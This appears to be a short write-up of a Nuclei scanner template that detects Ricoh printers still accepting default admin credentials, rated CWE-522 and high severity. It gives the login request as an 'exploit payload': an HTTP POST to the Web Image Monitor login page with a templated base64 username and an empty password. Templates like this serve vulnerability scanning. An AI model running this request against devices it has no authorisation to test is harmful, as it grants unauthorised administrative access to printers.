# Nuclei Template: Ricoh Default Login
**Template ID:** ricoh-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`ricoh-weak-password.yaml`)

## Vulnerability Information & PoC

## Description
Ricoh default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /web/guest/tw/websys/webArch/login.cgi HTTP/1.1
Host: {{Hostname}}
Cookie: cookieOnOffChecker=on;

wimToken=&userid_work=&userid={{base64(username)}}&password_work=&password=&open=
```

## References
- https://ricoh-printer.co/default-username-and-password-for-ricoh-web-image-monitor/
